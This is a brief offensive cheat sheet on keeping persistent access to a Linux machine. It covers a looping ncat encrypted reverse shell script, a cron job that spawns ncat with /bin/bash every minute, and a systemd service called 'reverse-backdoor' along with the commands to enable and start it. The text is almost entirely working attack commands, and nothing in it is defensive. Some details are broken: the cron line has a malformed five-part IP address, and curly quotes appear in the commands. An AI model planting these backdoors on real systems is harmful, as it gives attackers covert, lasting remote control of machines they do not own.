## Persistence via bash backdoor

An encrypted reverse shell:

```bash
#!/bin/bash

IP="10.10.10.10"
PORT=42024

while true; do 
    ncat “$IP” “$PORT” -e /bin/bash --ssl
done
```

## Persistence via cron job

```text
*/1 * * * * root "/bin/ncat 3.66.190.34.22 42024 -e /bin/bash --ssl"
```

## Persistence via system service

Preparing the service descriptor:

```bash
cat /usr/lib/systemd/system/reverse-backdoor.service
[Unit]
Description=Backdoor
After=network.target

[Service]
Type=simple
RemainAfterExit=yes

ExecStart=/home/ubuntu/reverse-backdoor 0.0.0.0 42024
ExecStop=killall reverse-backdoor

[Install]
WantedBy=multi-user.target
```

Giving executable permissions:

```bash
chmod +x /home/ubuntu/reverse-backdoor
```

Applying changes to systemd:

```bash
systemctl daemon-reload
systemctl enable reverse-backdoor
systemctl start reverse-backdoor
```